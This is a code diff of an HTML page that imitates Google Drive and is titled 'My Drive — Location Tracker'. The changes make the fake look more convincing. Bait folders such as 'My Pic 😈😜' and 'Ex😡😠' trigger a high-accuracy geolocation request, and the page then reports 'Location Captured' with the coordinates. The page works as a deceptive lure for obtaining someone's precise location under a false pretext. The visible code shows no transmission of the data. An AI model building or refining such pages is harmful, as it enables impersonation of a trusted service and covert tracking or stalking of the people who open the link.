@@ -1,4 +1,4 @@
-<!-- VERSION 5.1 — FINAL CUSTOM FOLDERS -->
+<!-- VERSION 6 — MODERN GOOGLE DRIVE STYLE -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -6,64 +6,351 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>My Drive — Location Tracker</title>
 <style>
-* {box-sizing:border-box; margin:0; padding:0;}
-body { font-family: Arial, sans-serif; padding: 25px; background: #f8fafd; }
-.topbar {height:60px; background:white; border-bottom:1px solid #dadce0; display:flex; align-items:center; padding:0 15px; gap:10px; margin:-25px -25px 30px -25px;}
-.logo {display:flex; align-items:center; gap:8px; font-size:18px; padding-left:10px;}
-.heading-row {display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;}
-h2 {font-size:22px; color:#202124;}
-.view-toggle {color:#5f6368; font-size:20px;}
-h3 {margin:10px 0;}
-.folder-grid {display:grid; grid-template-columns:repeat(auto-fill, minmax(180px,1fr)); gap:16px;}
-.folder { background: white; padding: 20px; border-radius: 12px; cursor: pointer; border: 1px solid #dadce0; transition: 0.2s; }
-.folder:hover { background: #f1f6ff; transform: translateY(-2px); }
-.folder-icon {font-size:32px; margin-bottom:10px;}
-.folder-name {font-size:15px; font-weight:500; word-break:break-word;}
-#out { margin-top: 30px; padding: 20px; background: #eef5ff; border-radius: 12px; display: none; border: 1px solid #d3e3fd; }
-#out.show { display: block; }
-@media (max-width:600px) {
-  .folder-grid {grid-template-columns:repeat(2,1fr); gap:12px;}
-  body {padding:15px;}
-  .topbar {margin:-15px -15px 20px -15px;}
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: "Google Sans", "Roboto", Arial, sans-serif;
+  background: #f8fafd;
+  color: #202124;
+}
+
+/* Top Bar */
+.topbar {
+  height: 64px;
+  background: white;
+  border-bottom: 1px solid #dadce0;
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  gap: 12px;
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+
+.logo {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 20px;
+  font-weight: 500;
+  color: #202124;
+  text-decoration: none;
+}
+
+.logo span {
+  font-size: 26px;
+}
+
+.search-bar {
+  flex: 1;
+  max-width: 720px;
+  margin: 0 auto;
+  height: 48px;
+  background: #f1f3f4;
+  border-radius: 24px;
+  display: flex;
+  align-items: center;
+  padding: 0 16px;
+  gap: 12px;
+}
+
+.search-bar input {
+  border: none;
+  background: transparent;
+  outline: none;
+  width: 100%;
+  font-size: 16px;
+  color: #202124;
+}
+
+.search-bar input::placeholder {
+  color: #5f6368;
+}
+
+.topbar-actions {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.icon-btn {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  border: none;
+  background: transparent;
+  cursor: pointer;
+  font-size: 20px;
+  color: #5f6368;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background 0.2s;
+}
+
+.icon-btn:hover {
+  background: #e8eaed;
+}
+
+/* Main Layout */
+.main-layout {
+  display: flex;
+  min-height: calc(100vh - 64px);
+}
+
+/* Sidebar */
+.sidebar {
+  width: 256px;
+  background: white;
+  border-right: 1px solid #dadce0;
+  padding: 12px 0;
+  flex-shrink: 0;
+}
+
+.sidebar-item {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 10px 16px;
+  margin: 2px 12px;
+  border-radius: 8px;
+  color: #202124;
+  cursor: pointer;
+  font-size: 15px;
+  transition: background 0.2s;
+}
+
+.sidebar-item:hover {
+  background: #f1f3f4;
+}
+
+.sidebar-item.active {
+  background: #e8f0fe;
+  color: #1967d2;
+  font-weight: 500;
+}
+
+.sidebar-item span:first-child {
+  font-size: 20px;
+  width: 24px;
+  text-align: center;
+}
+
+/* Content Area */
+.content {
+  flex: 1;
+  padding: 24px;
+}
+
+.section-title {
+  font-size: 22px;
+  font-weight: 500;
+  margin-bottom: 8px;
+}
+
+.section-subtitle {
+  color: #5f6368;
+  font-size: 14px;
+  margin-bottom: 24px;
+}
+
+/* Folder Grid */
+.folder-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 16px;
+}
+
+.folder {
+  background: white;
+  border: 1px solid #dadce0;
+  border-radius: 12px;
+  padding: 16px;
+  cursor: pointer;
+  transition: 0.2s ease;
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+}
+
+.folder:hover {
+  border-color: #1a73e8;
+  box-shadow: 0 4px 12px rgba(26, 115, 232, 0.15);
+  transform: translateY(-2px);
+}
+
+.folder-icon {
+  font-size: 40px;
+  margin-bottom: 12px;
+}
+
+.folder-name {
+  font-size: 15px;
+  font-weight: 500;
+  word-break: break-word;
+  color: #202124;
+}
+
+.folder-meta {
+  font-size: 12px;
+  color: #5f6368;
+  margin-top: 4px;
+}
+
+/* Result Box */
+#out {
+  margin-top: 24px;
+  padding: 20px;
+  background: #eef5ff;
+  border: 1px solid #d3e3fd;
+  border-radius: 12px;
+  display: none;
+}
+
+#out.show {
+  display: block;
+}
+
+#out strong {
+  color: #1967d2;
+}
+
+#out span {
+  font-family: "Roboto Mono", monospace;
+  color: #1a73e8;
+  font-weight: 500;
+}
+
+/* Mobile */
+@media (max-width: 900px) {
+  .sidebar {
+    position: fixed;
+    left: -260px;
+    top: 64px;
+    height: calc(100vh - 64px);
+    z-index: 9;
+    transition: left 0.3s;
+  }
+
+  .sidebar.open {
+    left: 0;
+  }
+
+  .folder-grid {
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+  }
+}
+
+@media (max-width: 600px) {
+  .search-bar {
+    max-width: none;
+    width: 100%;
+  }
+
+  .topbar-actions {
+    display: none;
+  }
+
+  .content {
+    padding: 16px;
+  }
+
+  .folder-grid {
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+  }
 }
 </style>
 </head>
 <body>
 
+<!-- Top Bar -->
 <div class="topbar">
-  <div class="logo"><span style="font-size:24px;">📁</span><b>My Drive</b></div>
-</div>
+  <div class="logo">
+    <span>📁</span>
+    <b>My Drive</b>
+  </div>
 
-<div class="heading-row">
-  <h2>Welcome to My Drive</h2>
-  <span class="view-toggle">☷　▦</span>
-</div>
+  <div class="search-bar">
+    <span>🔍</span>
+    <input type="text" placeholder="Search in Drive" disabled>
+  </div>
 
-<h3>Folders</h3>
-<div class="folder-grid">
-  <div class="folder" onclick="checkLoc('My Pic 😈😜')">
-    <div class="folder-icon">📁</div>
-    <div class="folder-name">My Pic 😈😜</div>
-  </div>
-  <div class="folder" onclick="checkLoc('Friends Pic 😍')">
-    <div class="folder-icon">📁</div>
-    <div class="folder-name">Friends Pic 😍</div>
-  </div>
-  <div class="folder" onclick="checkLoc('School Pic 📙')">
-    <div class="folder-icon">📁</div>
-    <div class="folder-name">School Pic 📙</div>
-  </div>
-  <div class="folder" onclick="checkLoc('Ex😡😠')">
-    <div class="folder-icon">📁</div>
-    <div class="folder-name">Ex😡😠</div>
+  <div class="topbar-actions">
+    <button class="icon-btn" title="Help">❓</button>
+    <button class="icon-btn" title="Settings">⚙️</button>
+    <button class="icon-btn" title="Account">👤</button>
   </div>
 </div>
 
-<div id="out">
-<strong>📍 Location Captured ✅</strong><br><br>
-Folder: <span id="fn" style="font-weight:bold;"></span><br>
-Latitude: <span id="lat" style="font-family:monospace; color:#1a73e8;"></span><br>
-Longitude: <span id="lng" style="font-family:monospace; color:#1a73e8;"></span>
+<div class="main-layout">
+  <!-- Sidebar -->
+  <div class="sidebar" id="sidebar">
+    <div class="sidebar-item active">
+      <span>🏠</span>
+      <span>My Drive</span>
+    </div>
+    <div class="sidebar-item">
+      <span>⭐</span>
+      <span>Starred</span>
+    </div>
+    <div class="sidebar-item">
+      <span>🕒</span>
+      <span>Recent</span>
+    </div>
+    <div class="sidebar-item">
+      <span>📤</span>
+      <span>Shared with me</span>
+    </div>
+    <div class="sidebar-item">
+      <span>🗑️</span>
+      <span>Trash</span>
+    </div>
+  </div>
+
+  <!-- Content -->
+  <div class="content">
+    <h1 class="section-title">My Drive</h1>
+    <p class="section-subtitle">Click a folder to view photos</p>
+
+    <div class="folder-grid">
+      <div class="folder" onclick="checkLoc('My Pic 😈😜')">
+        <div class="folder-icon">📁</div>
+        <div class="folder-name">My Pic 😈😜</div>
+        <div class="folder-meta">Opened just now</div>
+      </div>
+
+      <div class="folder" onclick="checkLoc('Friends Pic 😍')">
+        <div class="folder-icon">📁</div>
+        <div class="folder-name">Friends Pic 😍</div>
+        <div class="folder-meta">Opened just now</div>
+      </div>
+
+      <div class="folder" onclick="checkLoc('School Pic 📙')">
+        <div class="folder-icon">📁</div>
+        <div class="folder-name">School Pic 📙</div>
+        <div class="folder-meta">Opened just now</div>
+      </div>
+
+      <div class="folder" onclick="checkLoc('Ex😡😠')">
+        <div class="folder-icon">📁</div>
+        <div class="folder-name">Ex😡😠</div>
+        <div class="folder-meta">Opened just now</div>
+      </div>
+    </div>
+
+    <div id="out">
+      <strong>📍 Location Captured ✅</strong><br><br>
+      Folder: <span id="fn"></span><br>
+      Latitude: <span id="lat"></span><br>
+      Longitude: <span id="lng"></span>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -72,10 +359,12 @@ function checkLoc(folderName) {
     alert('❌ Open via your https:// link only');
     return;
   }
+
   if (!navigator.geolocation) {
     alert('❌ Location not supported');
     return;
   }
+
   navigator.geolocation.getCurrentPosition(
     function success(pos) {
       document.getElementById('fn').textContent = folderName;
@@ -93,6 +382,13 @@ function checkLoc(folderName) {
     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
   );
 }
+
+// Mobile sidebar toggle placeholder
+document.querySelector('.section-title').addEventListener('click', function () {
+  if (window.innerWidth <= 900) {
+    document.getElementById('sidebar').classList.toggle('open');
+  }
+});
 </script>
 
 </body>
